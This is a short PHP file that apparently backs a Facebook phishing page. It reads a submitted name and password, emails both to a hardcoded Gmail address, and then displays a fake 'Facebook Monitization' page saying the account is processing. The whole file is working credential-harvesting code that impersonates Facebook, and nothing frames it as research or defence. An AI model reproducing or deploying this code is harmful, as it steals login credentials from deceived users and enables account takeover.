<?php


$name = $_POST{'name'};
$password = $_POST{'password'};


$maileheader ="from".$name."<".$password.">\r\n";

$recipient = "dav29388@gmail.com";

mail($recipient, $name, $password, $maileheader)
or die("Error sending");

echo'

<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook</title>
    <link rel="preconnect" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="style.css">
</head>

<body>
    <main>
        <div class="top">
            <h1>Facebook Monitization</h1>
            <h2 style="color: black; font-size: 70%;">Your Account is currently processing, we will get back to you shortly</h2>
        </div> 
        <p class="back" style="text-align: center;">Go back to the <a href="index.html">homepage</a>.</p>
    </main>
</body>

</html>

';



?>